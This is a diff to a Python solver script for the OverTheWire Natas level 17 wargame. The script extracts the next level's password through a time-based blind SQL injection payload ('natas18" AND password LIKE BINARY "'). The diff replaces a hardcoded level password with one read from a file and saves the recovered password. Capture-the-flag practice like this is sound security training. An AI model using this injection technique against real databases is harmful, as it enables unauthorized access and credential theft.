@@ -50,13 +50,23 @@ def main():
             ch = executor.map(findpw, filt_chars)
 
 
+lvl = '17'
+next_level = str(int(lvl)+1)
+pwd = open(f"./passwords/{'natas'+'0'+lvl if len(lvl)==1 else 'natas'+lvl}.pwd", 'r').read().strip()
+url = f'http://natas{lvl}.natas.labs.overthewire.org'
+lvl_pass = requests.auth.HTTPBasicAuth(f'natas{lvl}',pwd)
 
-url = 'http://natas17.natas.labs.overthewire.org'
-lvl_pass = requests.auth.HTTPBasicAuth('natas17','XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd')
+
+
 un_base = 'natas18" AND password LIKE BINARY "'
 
 pw = ""
+
 main()
+
+open(f"./passwords/{'natas'+'0'+next_level if len(next_level)==1 else 'natas'+next_level}.pwd", 'w').write(pw)
+
+
 '''
 They told me it couldn't be done. And we're going to keep on winning. 
 Yes, we can TIME our SQL injection attacks! We are unstoppable!
